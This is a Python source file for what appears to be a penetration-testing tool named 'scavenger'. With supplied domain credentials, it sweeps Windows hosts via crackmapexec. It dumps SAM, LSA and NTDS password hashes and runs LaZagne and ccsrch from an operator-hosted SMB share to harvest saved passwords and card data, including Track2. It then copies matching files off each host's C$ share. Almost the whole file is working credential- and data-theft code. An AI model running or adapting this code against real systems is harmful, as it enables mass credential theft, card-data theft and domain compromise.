#!/usr/bin/env python3

# Copyright (C) 2018 Philip (haxrbyte) Pieterse
#
# This program is free software; you can redistribute it and/or modify it under
# the terms of the GNU General Public License version 2, as published by the
# Free Software Foundation
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details (http://www.gnu.org/licenses/gpl.txt).

__author__ = 'Philip (haxrbyte) Pieterse'
__email__ = 'ppieterse@trustwave.com'
__git__ = 'https://github.com/SpiderLabs/scavenger.git'
__twitter__ = 'http://twitter.com/haxrbyte'
__version__ = 'v1.0'
__license__ = 'GPLv3.0'

from os import setsid, geteuid, killpg, path, mkdir, chdir
from sys import argv, exit
from argparse import ArgumentParser, RawDescriptionHelpFormatter, FileType
from os import path
from ipaddress import ip_network, ip_address
from queue import Queue
from time import time, strptime, strftime, sleep
from threading import Thread
from subprocess import Popen, PIPE, CalledProcessError, TimeoutExpired
from re import search, sub, finditer, S, compile
from sqlite3 import connect, Row
from signal import SIGTERM, signal, SIGINT
from socket import socket, AF_INET, SOCK_DGRAM
from pathlib import Path, PosixPath, PurePosixPath, PureWindowsPath, WindowsPath

def test_smb_server():
    smb_server_test = False
    process_test = command_execute("smbclient //10.0.0.100/scav/ % -c ls -q")
    if len(process_test) > 0:
        smb_server_test = True
    return smb_server_test

def smb_server():
    command_execute("""kill $(ps aux | grep '[s]mbserver.py' | awk '{print $2}')""")
    process = Popen("""python2 /usr/local/bin/smbserver.py -comment 'scavenger' scav server/""", stdout=PIPE,stderr=PIPE, shell=True, preexec_fn=setsid)

    global PID
    PID = process.pid

    return

def print_debug(uniq_string, var):
    print(f"DEBUG {uniq_string}: {var}")

def feed_database(ip, sysinfo):
    db = connect("results/scavenger-cache.dscav")
    db.isolation_level = None
    db.text_factory = str
    con_db = db.cursor()

    print(f"AWESOME: {ip}{sysinfo}")

    with db:
        for line in sysinfo:
            print(f"DEBUG: {line}")
            with db:
                sql_command = (
                    f"INSERT INTO '{ip}_info_smb_latest' VALUES ("
                    f":ip_address, "
                    f":runas, "
                    f":host_name, "
                    f":os_name, "
                    f":win_dir, "
                    f":sys_dir, "
                    f":domain_name, "
                    f":nr_net) "
                )
                con_db.execute(sql_command, {'ip_address': sysinfo[0],
                                             'runas': sysinfo[1],
                                             'host_name': sysinfo[2],
                                             'os_name': sysinfo[3],
                                             'win_dir': sysinfo[4],
                                             'sys_dir': sysinfo[5],
                                             'domain_name': sysinfo[6],
                                             'nr_net': sysinfo[7]})


def create_database(test_type, service):
    db = connect("results/scavenger-cache.dscav")
    db.isolation_level = None
    db.text_factory = str
    con_db = db.cursor()

    if test_type == 'info':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    dc_c integer NOT NULL,
                                                                                    mh_c integer NOT NULL,
                                                                                    sh_c integer NOT NULL,
                                                                                    lh_c integer NOT NULL,
                                                                                    nh_c integer NOT NULL,
                                                                                    cc_c integer NOT NULL,
                                                                                    t2_c integer NOT NULL,
                                                                                    laz_b_c integer NOT NULL,
                                                                                    laz_s_c integer NOT NULL,
                                                                                    runas text NOT NULL, 
                                                                                    host_name text NOT NULL, 
                                                                                    os_name text NOT NULL,
                                                                                    win_dir text NOT NULL,
                                                                                    sys_dir text NOT NULL,
                                                                                    domain_name text NOT NULL,
                                                                                    nr_net integer NOT NULL)
                                                                                """

    elif test_type == 'time':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    folder_name text NOT NULL,
                                                                                    folder_date text NOT NULL)
                                                                                """

    elif test_type == 'credit':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    t2_c integer NOT NULL,
                                                                                    folder_cc text NOT NULL)
                                                                                """

    elif test_type == 'laz_b':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    laz_browsers text NOT NULL)
                                                                                """
    elif test_type == 'laz_s':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    laz_sysadmin text NOT NULL)
                                                                                """

    elif test_type == 'hashes_sam':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    sam_hashes text NOT NULL)
                                                                                """

    elif test_type == 'hashes_lsa':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    lsa_hashes text NOT NULL)
                                                                                """

    elif test_type == 'hashes_ntds':
        sql_command = f"""
                                                                                    CREATE TABLE '{test_type}_{service}_latest' (
                                                                                    ip_address text NOT NULL,
                                                                                    ntds_hashes text NOT NULL)
                                                                                """


    with db:
        con_db.execute(sql_command)


def smb_hosts(ip):

    hostname = crackmapexec_command_exec(ip, '-x hostname')
    host = str(hostname[-1].upper())

    sysinfo = []
    sysinfo_display = []
    folder_list = []
    dc = False
    mh = False
    cc = False
    t2 = False
    sh = False
    lh = False
    nh = False
    lz_b = False
    lz_s = False
    hostname_result = None

    who = (crackmapexec_command_exec(ip, "-x 'whoami'"))
    if who:
        sysinfo_display.append(f"Running as user   : {who[-1]}")
        sysinfo.append(who[-1])

    domain_control = (crackmapexec_command_exec(ip, "-x 'dsquery server'"))

    output = (crackmapexec_command_exec(ip, "-x 'systeminfo'"))
    for line in output:

        # print(line)
        hostname_match = search(r'^Host\sName:\s+(.+)$', line)
        domain_match = search(r'^Domain:\s+([\w\d.-]+)$', line)
        os_match = search(r'^OS\sName:\s+([\w()\s\d,]+)$', line)
        windir_match = search(r'^Windows\sDirectory:\s+([\w:\\]+)$', line)
        sysdir_match = search(r'^System\sDirectory:\s+([\w:\\]+)$', line)
        net_match = search(r'Network\sCard\(s\):\s+(\d)([\d\s\w\(\).]+)$', line)

        if hostname_match:
            hostname_result = hostname_match.group(1)
            sysinfo.append(hostname_match.group(1))

        elif domain_match:
            if '"CN=' in domain_control[-1]:
                sysinfo_display.append("Domain            : {}".format(domain_match.group(1)))
                sysinfo.append(domain_match.group(1))
                dc = True
            else:
                sysinfo_display.append("Domain            : {}".format(domain_match.group(1)))
                sysinfo.append(domain_match.group(1))

        elif os_match:
            sysinfo_display.append("Operating System  : {}".format(os_match.group(1)))
            sysinfo.append(os_match.group(1))
        elif windir_match:
            sysinfo.append(windir_match.group(1))
        elif sysdir_match:
            sysinfo.append(sysdir_match.group(1))
        elif net_match:
            if int(net_match.group(1)) > 1:
                sysinfo.append(net_match.group(1))

                mh = True
            else:
                sysinfo.append(net_match.group(1))

    int_folders = ['c:\\users\\administrator\\desktop\\','c:\\docume~1\\administrator\\desktop\\',
                   'c:\\users\\administrator\\downloads\\','c:\\windows\system32\\config\\',
                   'c:\\windows\\system32\\drivers\etc\\', 'c:\\windows\\repair\\',
                   'c:\\windows\\ntds\\', 'c:\\inetpub\\', 'c:\\wmpub\\']

    for folder in int_folders:
        folders = (crackmapexec_command_exec(ip, f"""-x 'forfiles.exe /P {folder} /S /C "cmd /c echo @path @fdate @ftime"'"""))
        for line in folders:
            folder_match = search(r'^\"(.+)\"\s([\d/]+)\s([\d:]+)\s([AM|PM]+)', line)
            if folder_match:
                time_12hour = (folder_match.group(2) + ' ' + folder_match.group(3) + ' ' + folder_match.group(4))
                t = strptime(time_12hour, "%m/%d/%Y %I:%M:%S %p")
                time_24hour = strftime("%Y-%m-%d,%H:%M", t)
                time_24hour_list = time_24hour.split(",")
                folder_list.append(f"{folder_match.group(1)},{time_24hour_list[0]},{time_24hour_list[1]}".split(','))

    sam = (crackmapexec_command_exec(ip, "--sam"))
    sam_hashes = []

    for line in sam:
        sam_match = search(r'^.+:\d+:[\d\w]+:[\d\w]+:::', line)
        if sam_match:
            sam_hashes.append(sam_match.group(0))
            sh = True

    lsa = (crackmapexec_command_exec(ip, "--lsa"))
    lsa_secrets = []

    for line in lsa:
        lsa_match = search(r'^[\w\d\\\-\$\_]+:[\w\d:.\-]+', line)
        if lsa_match:
            lsa_secrets.append(lsa_match.group(0))
            lh = True

    ntds = (crackmapexec_command_exec(ip, "--ntds drsuapi"))

    ntds_hashes = []

    for line in ntds:
        ntds_match = search(r'^.+:\d+:[\d\w]+:[\d\w]+:::', line)
        if ntds_match:
            ntds_hashes.append(ntds_match.group(0))
            nh = True

    credit_list = []
    t2_display_list = []

    localip_address = (localip())

    if test_smb_server():

        for folder in int_folders:
            credit_card = (crackmapexec_command_exec(ip, f"-x '\\\\{localip_address}\\scav\\ccsrch.exe -T {folder}'"))
            for line in credit_card:
                credit_card_match = search(r'^([a-z]:.+)\s([A-Z_]+)\s+(\d+).*', line)
                if credit_card_match:
                    cc = True
                    if not 'edb00002.log' in credit_card_match.group(0):
                        match_t = search(r'TRACK_2', credit_card_match.group(0).strip())
                        if match_t:
                            t2 = True
                            credit_string = f"{credit_card_match.group(1)} {credit_card_match.group(2)} {credit_card_match.group(3)} ** TRACK2 **"
                            credit_list.append(credit_string)
                        else:
                            credit_string = f"{credit_card_match.group(1)} {credit_card_match.group(2)} {credit_card_match.group(3)}"
                            credit_list.append(credit_string)
                    else:
                        cc = False

        laz_list = ['URL:', 'Login:', 'Password:']
        lazagne_list_browsers = []

        laz_loop = 0
        for laz_loop in range(4):
            laz_loop += 1
            lazagne_browsers = crackmapexec_command_exec(ip, f"-x '\\\\{localip_address}\\scav\\laZagne_scav.exe browsers'")
            finished = False
            for line in lazagne_browsers:
                if 'passwords' in line:
                    lazagne_list_browsers.append(line)
                elif 'found' in line:
                    lazagne_list_browsers.append(line)
                elif 'URL:' in line:
                    lazagne_list_browsers.append(line)
                elif 'Login:' in line:
                    lazagne_list_browsers.append(line)
                elif 'Password:' in line:
                    lazagne_list_browsers.append(line)
                elif 'Port:' in line:
                    lazagne_list_browsers.append(line)
                elif 'elapsed' in line:
                    finished = True

            if finished == True:
                break

        lazagne_list_sysadmin = []

        laz_loop2 = 0
        for laz_loop2 in range(4):
            laz_loop2 += 1
            lazagne_sysadmin = crackmapexec_command_exec(ip, f"-x '\\\\{localip_address}\\scav\\laZagne_scav.exe sysadmin'")
            finished2 = False
            for line in lazagne_sysadmin:
                if 'passwords' in line:
                    lazagne_list_sysadmin.append(line)
                elif 'found' in line:
                    lazagne_list_sysadmin.append(line)
                elif 'URL:' in line:
                    lazagne_list_sysadmin.append(line)
                elif 'Login:' in line:
                    lazagne_list_sysadmin.append(line)
                elif 'Password:' in line:
                    lazagne_list_sysadmin.append(line)
                elif 'Port:' in line:
                    lazagne_list_sysadmin.append(line)
                elif 'elapsed' in line:
                    finished2 = True

            if finished2 == True:
                break
    else:
        print_debug('SMB Server not working')

    screen_output = []

    if '[+] 0 passwords have been found.' not in lazagne_list_browsers and len(lazagne_list_browsers) > 0:
        lz_b = True
    else:
        lz_b = False
        lazagne_list_browsers = []
    if '[+] 0 passwords have been found.' not in lazagne_list_sysadmin and len(lazagne_list_sysadmin) > 0:
        lz_s = True
    else:
        lz_s = False
        lazagne_list_sysadmin = []

    if dc:
        screen_output.append("Domain Controller")
    if mh:
        screen_output.append("Multi Homed")
    if cc:
        screen_output.append("Card Holder Data")
    if t2:
        screen_output.append("Track2")
    if lz_b or lz_s:
        screen_output.append("Other Credentials")
    if sh:
        screen_output.append("SAM Hashes")
    if lh:
        screen_output.append("LSA Secrets")
    if nh:
        screen_output.append("AD Hashes")

    return sysinfo_display, sysinfo, folder_list, sam_hashes, lsa_secrets, ntds_hashes, dc, mh, sh, lh, nh, cc, lz_b, lz_s, credit_list, t2, t2_display_list, lazagne_list_browsers, lazagne_list_sysadmin, screen_output, host


def scavenger_process(ip):
    output, sysinfo, folder_list, sam_hashes, lsa_hashes, ntds_hashes, dc_check, mh_check, sh_check, lh_check, nh_check, cc_check, lz_b_check, lz_s_check, credit_list, t2_check, tc_display, laz_browsers, laz_sysadmin, screen_output, hostname = smb_hosts(ip)

    printing(ip, f"=== START => {ip} ===", color='gray')
    screen_output_str = " * ".join(screen_output)
    print(f"\033[94m[+] \033[00m{ip} ({hostname}) => \033[91m{screen_output_str}\033[00m")
    for line in output:
        print(line)

    if dc_check:
        dc_int = 1
    else:
        dc_int = 0
    if mh_check:
        mh_int = 1
    else:
        mh_int = 0
    if sh_check:
        sh_int = 1
    else:
        sh_int = 0
    if lh_check:
        lh_int = 1
    else:
        lh_int = 0
    if nh_check:
        nh_int = 1
    else:
        nh_int = 0
    if cc_check:
        cc_int = 1
    else:
        cc_int = 0
    if t2_check:
        t2_int = 1
    else:
        t2_int = 0
    if lz_b_check:
        lz_b_int = 1
    else:
        lz_b_int = 0
    if lz_s_check:
        lz_s_int = 1
    else:
        lz_s_int = 0

    database_input_info = []
    database_input_ntds = []
    database_input_sam = []
    database_input_laz_b = []
    database_input_laz_s = []
    for line in sysinfo:
        database_input_info.append(line)

    database_input_time = []

    laz_browsers_str = " \n ".join(laz_browsers)
    laz_sysadmin_str = " \n ".join(laz_sysadmin)
    sam_hashes_str = " \n ".join(sam_hashes)

    for line in laz_browsers:
        database_input_laz_b.append(line)
    for line in laz_sysadmin:
        database_input_laz_s.append(line)
    for line in sam_hashes:
        database_input_sam.append(line)
    ntds_hashes_str = " \n ".join(ntds_hashes)
    for line in ntds_hashes:
        database_input_ntds.append(line)

    db = connect("results/scavenger-cache.dscav")
    db.isolation_level = None
    db.text_factory = str
    con_db = db.cursor()

    if len(database_input_info) > 0:
        with db:
            sql_command = (
                f"INSERT INTO 'info_smb_latest' VALUES ("
                f":ip_address, "
                f":dc_c, "
                f":mh_c, "
                f":sh_c, "
                f":lh_c, "
                f":nh_c, "
                f":cc_c, "
                f":t2_c, "
                f":laz_b_c, "
                f":laz_s_c, "
                f":runas, "
                f":host_name, "
                f":os_name, "
                f":win_dir, "
                f":sys_dir, "
                f":domain_name, "
                f":nr_net) "
            )
            con_db.execute(sql_command, {'ip_address': ip,
                                         'dc_c': dc_int,
                                         'mh_c': mh_int,
                                         'sh_c': sh_int,
                                         'lh_c': lh_int,
                                         'nh_c': nh_int,
                                         'cc_c': cc_int,
                                         't2_c': t2_int,
                                         'laz_b_c': lz_b_int,
                                         'laz_s_c': lz_s_int,
                                         'runas': database_input_info[0],
                                         'host_name': database_input_info[1],
                                         'os_name': database_input_info[2],
                                         'win_dir': database_input_info[3],
                                         'sys_dir': database_input_info[4],
                                         'domain_name': database_input_info[5],
                                         'nr_net': database_input_info[6]})

    if len(folder_list) > 0:

        for line in folder_list:
            with db:
                sql_command = (
                    f"INSERT INTO 'time_smb_latest' VALUES ("
                    f":ip_address, "
                    f":folder_name, "
                    f":folder_date) "
                )
                con_db.execute(sql_command, {'ip_address': ip,
                                             'folder_name': line[0],
                                             'folder_date': f"{line[1]} {line[2]}"})

    if len(credit_list) > 0:
        for line in credit_list:
            if 'edb00002.log' not in line:
                with db:
                    sql_command = (
                        f"INSERT INTO 'credit_smb_latest' VALUES ("
                        f":ip_address, "
                        f":t2_c, "
                        f":folder_cc) "
                    )
                    con_db.execute(sql_command, {'ip_address': ip,
                                                 't2_c': t2_int,
                                                 'folder_cc': line})

    if len(laz_browsers) > 0:
        for line in laz_browsers:
            with db:
                sql_command = (
                    f"INSERT INTO 'laz_b_smb_latest' VALUES ("
                    f":ip_address, "
                    f":laz_browsers) "
                )
                con_db.execute(sql_command, {'ip_address': ip,
                                             'laz_browsers': line})


    if len(laz_sysadmin) > 0:
        for line in laz_sysadmin:
            with db:
                sql_command = (
                    f"INSERT INTO 'laz_s_smb_latest' VALUES ("
                    f":ip_address, "
                    f":laz_sysadmin) "
                )
                con_db.execute(sql_command, {'ip_address': ip,
                                             'laz_sysadmin': line})


    if len(sam_hashes) > 0:
        for line in sam_hashes:
            with db:
                sql_command = (
                    f"INSERT INTO 'hashes_sam_smb_latest' VALUES ("
                    f":ip_address, "
                    f":sam_hashes) "
                )
                con_db.execute(sql_command, {'ip_address': ip,
                                             'sam_hashes': line})

    if len(lsa_hashes) > 0:
        for line in lsa_hashes:
            with db:
                sql_command = (
                    f"INSERT INTO 'hashes_lsa_smb_latest' VALUES ("
                    f":ip_address, "
                    f":lsa_hashes) "
                )
                con_db.execute(sql_command, {'ip_address': ip,
                                             'lsa_hashes': line})

    if len(ntds_hashes) > 0:
        for line in ntds_hashes:
            with db:
                sql_command = (
                    f"INSERT INTO 'hashes_ntds_smb_latest' VALUES ("
                    f":ip_address, "
                    f":ntds_hashes) "
                )
                con_db.execute(sql_command, {'ip_address': ip,
                                             'ntds_hashes': line})

    printing(ip, f"=== END => {ip} ===\n", color='gray')

    return

def crackmapexec_command_exec(ip, command):
    return_value = []
    output = command_execute(f"""crackmapexec {ip} -u {username_g} -p {password_g} -d {domain_g} {command}""")
    for line in output.splitlines():
        line2 = sub(r'\x1b\[[0-9;]*m', '', line)
        for m in finditer(r'^CME\s+\d+.\d+.\d+.\d+:\d+\s[\w_-]+\s+(.+)', line2, S):
            return_value.append(m.group(1))
    return return_value


def command_execute(command):
    try:
        process = Popen(command, stdout=PIPE, stderr=PIPE, bufsize=65536, shell=True, universal_newlines=True)
        output = process.communicate()[0]
    except CalledProcessError as e:
        print("Command Error:")
        print(e.output)
    return output

def printing(ip, text, **kwargs):
    color = kwargs.get('color', None)
    if not color:
        print(text)
    elif color == 'red':
        print("\033[91m{}\033[00m".format(text))
    elif color == 'yellow':
        print("\033[93m  {}\033[00m".format(text))
    elif color == 'gray':
        print("\033[97m{}\033[00m".format(text))
    elif color == 'blue':
        print("\033[94m{}\033[00m".format(text))
    elif color == 'info':
        print("\033[94m[*] \033[00m{}".format(text))
    elif color == 'warn':
        print("\033[91m[*] \033[00m{}".format(text))
    elif color == 'test':
        print("\033[97m[*] {} - \033[00m{}".format(ip, text))

def multithread_maker(scav_q):
    while True:
        worker = scav_q.get()
        scavenger_process(worker)
        scav_q.task_done()  # empty queue
    return

 #handles Crtl+C
def signal_handler(signal, frame):
    print("\n\033[97mCtrl+C\033[00m pressed.. aborting...")
    exit()

def localip():
    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    #print_debug(s.getsockname()[0])
    localip_address = s.getsockname()[0]
    s.close()
    return localip_address

def main():
    if geteuid() is not 0:
        print("Run me as r00t!")
        exit(1)

    script_path = path.dirname(path.abspath(__file__))

    if not path.exists("results"):
        mkdir("results")
    if not path.exists("downloads"):
        mkdir("downloads")

    banner = ("""
        \033[1;37;40m***************************************************\033[00m
        \033[1;37;40m*\033[1;33;40m  ___  ___ __ ___   _____ _ __   __ _  ___ _ __  \033[1;37;40m*\033[00m
        \033[1;37;40m*\033[1;33;40m / __|/ __/ _` \ \ / / _ \ '_ \ / _` |/ _ \ '__| \033[1;37;40m*\033[00m
        \033[1;37;40m*\033[1;33;40m \__ \ (_| (_| |\ V /  __/ | | | (_| |  __/ |    \033[1;37;40m*\033[00m
        \033[1;37;40m*\033[1;33;40m |___/\___\__,_| \_/ \___|_| |_|\__, |\___|_|    \033[1;37;40m*\033[00m
        \033[1;37;40m*\033[1;33;40m                                |___/            \033[1;37;40m*\033[00m
        \033[1;37;40m***************************************************\033[00m
    """)

    description = (
         f"scavenger.py v1.0 by Philip Pieterse (@haxrbyte) [https://github.com/SpiderLabs/scavenger]\n"
         f"{banner}\n"
        f"scavenger => definition [noun]: a person who searches for and collects discarded items.\n\n"
         f"              *** Powered and Inspired by ***\n\n"
         f"Impacket https://github.com/CoreSecurity/impacket (@agsolino)\n"
         f"CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec (@byt3bl33d3r)\n"
         f"ccsrch https://github.com/adamcaudill/ccsrch (@adamcaudill)\n"
         f"LaZagne https://github.com/AlessandroZ/LaZagne\n"
    )

    example = (
        f"examples:\n"
        f"$ python3 {argv[0]} smb -t 10.0.0.10 -u administrator -p Password123 -d test.local\n"
        f"$ python3 {argv[0]} smb -t iplist -u administrator -p Password123 -d test.local\n"
        f"$ python3 {argv[0]} smb --target iplist --username administrator --password Password123 --domain test.local --overwrite\n"
    )

    argument_parser = ArgumentParser(prog='scavenger.py', formatter_class=RawDescriptionHelpFormatter, description=description, epilog=example)

    argument_parser.add_argument("module", choices=['smb', 'test'], help="module: (SMB) or (SSH)")

    parser_group1 = argument_parser.add_argument_group("main arguments")
    parser_exclusive_group = parser_group1.add_mutually_exclusive_group(required=True)
    parser_exclusive_group.add_argument("-t", "--target", metavar="[target]", dest='target', type=str,help="IP address, CIDR Address Range (format example: 10.10.10.0/24) or a file with a list of IP addresses")
    parser_group1.add_argument("-u", "--username", metavar="[user]", dest='username', default='test', type=str,help="username of target")
    parser_group1.add_argument("-p", "--password", metavar="[pass]", dest='password', default='test', type=str,help="password of target")
    parser_group1.add_argument("-d", "--domain", metavar="[domain]", dest='domain', default="WORKGROUP", type=str,help="domain name (default : WORKGROUP)")
    parser_group1.add_argument("-o", "--overwrite", dest='overwrite', action='store_true',help="argument is used \033[91m!!!WARNING!!!\033[00m - lastest scavenger cache data overwrite previous scavenger cache data.")

    if len(argv) is 1:
        argument_parser.print_help()
        exit(1)

    args = argument_parser.parse_args()

    iplist = []

    if path.exists(args.target):
        with open(args.target, 'r') as target_file:
            for target in target_file:
                iplist.append(target.strip())

    elif '/' in args.target:
        net4 = ip_network(args.target, strict=False)
        for i in net4:
            iplist.append(str(i))

    elif ip_address(args.target):
        iplist.append(str(args.target))

    else:
        print("Wrong IP address range format - Please use this format x.x.x.x/24")
        exit(1)

    global username_g
    username_g = args.username
    global password_g
    password_g = args.password
    global domain_g
    domain_g = args.domain

    # if args.module == 'test':
    #     for a in range(len(iplist)):
    #         test = crackmapexec_command_exec(iplist[a], '-x hostname')
    #         print_debug("Test ", test)
    #     print("*** TEST DONE ***")
    #     exit(0)

    iplist_up = []

    for a in range(len(iplist)):
        test = crackmapexec_command_exec(iplist[a], '-x hostname')
        if not len(test) == 0:
            iplist_up.append(iplist[a])

    scav_queue = Queue()

    print(f"\nscavenger.py v1.0 by Philip Pieterse (@haxrbyte) [https://github.com/SpiderLabs/scavenger]")
    print(f"{banner}")

    printing('10.0.0.100', f"*** SCAVENGING STARTED ***\n", color='gray')

    compare = False
    previous_scav = False
    previous_scav_time = False
    detect = []

    if not path.isfile("results/scavenger-cache.dscav"):
        # print("DEBUG: FILE NOT EXIST: scavenger-cache.dscav")

        create_database('info', 'smb')
        create_database('time', 'smb')
        create_database('credit', 'smb')
        create_database('laz_b', 'smb')
        create_database('laz_s', 'smb')
        create_database('hashes_sam', 'smb')
        create_database('hashes_lsa', 'smb')
        create_database('hashes_ntds', 'smb')

    elif path.isfile("results/scavenger-cache.dscav"):
        detect.append("\033[94m[+]\033[00m Previous scavenger cached data found ...\n")
        db = connect("results/scavenger-cache.dscav")
        db.isolation_level = None
        db.text_factory = str
        con_db = db.cursor()

        types = ['info', 'time', 'credit', 'laz_b', 'laz_s', 'hashes_sam', 'hashes_lsa', 'hashes_ntds']

        for t in types:
            if not args.overwrite:
                with db:
                    table_check2 = con_db.execute(f"""SELECT name FROM sqlite_master WHERE type='table' AND name='{t}_smb_previous'""").fetchall()
                    table_check2_result = [item[0] for item in table_check2]
                    if f'{t}_smb_previous' in table_check2_result:
                            previous_scav = True
                            if f'time_smb_previous' in table_check2_result:
                                compare = True
                            con_db.execute(f"""DROP TABLE IF EXISTS '{t}_smb_latest'""")
                            create_database(f'{t}', 'smb')
                    else:
                        con_db.execute(f"""ALTER TABLE '{t}_smb_latest' RENAME TO '{t}_smb_previous'""")
                        con_db.execute(f"""DROP TABLE IF EXISTS '{t}_smb_latest'""")
                        create_database(f'{t}', 'smb')

            elif args.overwrite:
                with db:
                    table_check2 = con_db.execute(f"""SELECT name FROM sqlite_master WHERE type='table' AND name='{t}_smb_previous'""").fetchall()
                    table_check2_result = [item[0] for item in table_check2]
                    if f'{t}_smb_previous' in table_check2_result:
                        previous_scav = True
                        if f'time_smb_previous' in table_check2_result:
                            compare = True
                        con_db.execute(f"""DROP TABLE IF EXISTS '{t}_smb_previous'""")
                        con_db.execute(f"""ALTER TABLE '{t}_smb_latest' RENAME TO '{t}_smb_previous'""")
                        con_db.execute(f"""DROP TABLE IF EXISTS '{t}_smb_latest'""")
                        create_database(f'{t}', 'smb')
                    else:
                        con_db.execute(f"""ALTER TABLE '{t}_smb_latest' RENAME TO '{t}_smb_previous'""")
                        con_db.execute(f"""DROP TABLE IF EXISTS '{t}_smb_latest'""")
                        create_database(f'{t}', 'smb')

        if args.overwrite:
            print("\033[91m[+]\033[00m OVERWRITE ENABLED: Previous scavenger cached data will be overwriten...\n")

        detect_str = " ".join(detect)
        print(detect_str)

    for y in range(10):
        scav_thread = Thread(target=multithread_maker, args=(scav_queue,))
        scav_thread.daemon = True
        scav_thread.start()

    for z in range(len(iplist_up)):
        scav_queue.put(iplist_up[z])

    t = Thread(target=smb_server)
    t.daemon = True
    t.start()

    scav_queue.join()  # wait until thread terminates

    t.join()

    killpg(PID, SIGTERM)

    html_list_info = []
    html_list_time = []
    html_list_int = []
    html_list_compare1 = []
    html_list_compare2 = []
    html_list_hashes = []

    html_list_credit = []

    html_list_laz_browsers = []
    html_list_laz_sysadmin = []

    html_list_sam_hashes = []
    html_list_lsa_hashes = []
    html_list_ntds_hashes = []

    db = connect("results/scavenger-cache.dscav")
    db.isolation_level = None
    db.text_factory = str
    con_db = db.cursor()

    with db:
        info_smb = con_db.execute(f"""SELECT * FROM 'info_smb_latest' ORDER by ip_address""")
        for r in info_smb:
            html_list_info.append(r)

    for i in iplist_up:
        with db:
            time_smb = con_db.execute(f"""SELECT * FROM 'time_smb_latest' WHERE ip_address='{i}' ORDER BY folder_date DESC LIMIT 20""")
            for r in time_smb:
                html_list_time.append(r)

    intphrase = ["pass", "secret", "card", "pan", "credit", "security", "ntuser.dat", "SAM", "hosts", "ntds", "pentest", "penetration", "red tean", "owasp"]

    for word in intphrase:
        with db:
            word = "'%" + word + "%'"
            int_smb = con_db.execute(f"""SELECT DISTINCT ip_address,folder_name FROM time_smb_latest WHERE folder_name LIKE {word}""")
            for r in int_smb:
                html_list_int.append(r)

    if len(html_list_int) > 0:

        html_list_int_u = list(set(html_list_int))
        files_int_list_download = []
        for ip_int_download, fold_download in html_list_int_u:
            parent3 = str(PureWindowsPath(fold_download).parent)
            file3 = str(PureWindowsPath(fold_download).name)
            size = crackmapexec_command_exec(ip_int_download, f"""-x 'forfiles.exe /P "{parent3}" /m "{file3}" /C "cmd /c echo @fsize"'""")
            if int(size[-1]) > 0 and int(size[-1 ]) < 314572800:
                if not path.exists(f"downloads/{ip_int_download}"):
                    mkdir(f"downloads/{ip_int_download}")
                parent3 = parent3.replace('c:', '')
                command_execute(f"""smbclient //{ip_int_download}/c$ -c 'lcd downloads/{ip_int_download}; cd {parent3}; get \"{file3}\"' -U {username_g}%{password_g} -W {domain_g}""")
                files_int_list_download.append(f"\033[97m{ip_int_download} -\033[00m {fold_download} \033[97m=> local:\033[00m {script_path}/downloads/{ip_int_download}/{file3}")

        files_int_list_download_set = set(files_int_list_download)

    if compare:

        if not args.overwrite:
            detect.append("\n\033[94m[+]\033[00m Previous scavenger cached data will be preserved ...\n")

        detect.append("\n\033[94m[+]\033[00m Running scavenger cache data compare ...\n")

        compare1_check = False
        compare2_check = False

        with db:
            time_smb_compare1 = con_db.execute(f"""SELECT * FROM (SELECT * FROM time_smb_latest EXCEPT SELECT * FROM time_smb_previous) ORDER BY folder_date DESC LIMIT 20""")
            for r in time_smb_compare1:
                html_list_compare1.append(r)

        if len(html_list_compare1) > 0:
            compare1_check = True

        with db:
            time_smb_compare2 = con_db.execute(f"""SELECT * FROM (SELECT * FROM time_smb_previous EXCEPT SELECT * FROM time_smb_latest) ORDER BY folder_date DESC LIMIT 20""")
            for r in time_smb_compare2:
                html_list_compare2.append(r)

        if len(html_list_compare2) > 0:
            compare2_check = True

    with db:
        credit_smb = con_db.execute(f"""SELECT ip_address,folder_cc FROM credit_smb_latest ORDER BY ip_address""")
        for r in credit_smb:
            html_list_credit.append(r)

    if len(html_list_credit) > 0:

        cc_file_list = []
        for ip_cc_download, fold_cc_download in html_list_credit:
            cc_match_download = search(r'^(.+)\s{1}[A-Z_]+\s{1}\d+\s?', fold_cc_download)
            if cc_match_download:
                cc_match_download2 = search(r'^(\w{1}:.+)(\/[\w\d\-\.\@]+.\w{3})', cc_match_download.group(1))
                if cc_match_download2:
                    parent = cc_match_download2.group(1)
                    file = cc_match_download2.group(2)
                parent2 = str(PureWindowsPath(cc_match_download.group(1)).parent)
                file2 = str(PureWindowsPath(cc_match_download.group(1)).name)

            size_c = crackmapexec_command_exec(ip_cc_download, f"""-x 'forfiles.exe /P "{parent2}" /m "{file2}" /C "cmd /c echo @fsize"'""")
            if int(size_c[-1]) > 0 and int(size_c[-1 ]) < 314572800:
                if not path.exists(f"downloads/{ip_cc_download}/chdfiles"):
                    mkdir(f"downloads/{ip_cc_download}/chdfiles")
                parent2 = parent2.replace('c:', '')
                command_execute(f"""smbclient //{ip_cc_download}/c$ -c 'lcd downloads/{ip_cc_download}/chdfiles; cd {parent2}; get \"{file2}\"' -U {username_g}%{password_g} -W {domain_g}""")
                cc_file_list.append(f"\033[97m{ip_cc_download} -\033[00m {cc_match_download.group(1)} \033[97m=> local:\033[00m {script_path}/downloads/{ip_cc_download}/chdfiles/{file2}")

        cc_file_list_set = set(cc_file_list)

    laz_browsers_check = False

    with db:
        laz_browser = con_db.execute(f"""SELECT ip_address,laz_browsers FROM laz_b_smb_latest ORDER BY ip_address""")
        for r in laz_browser:
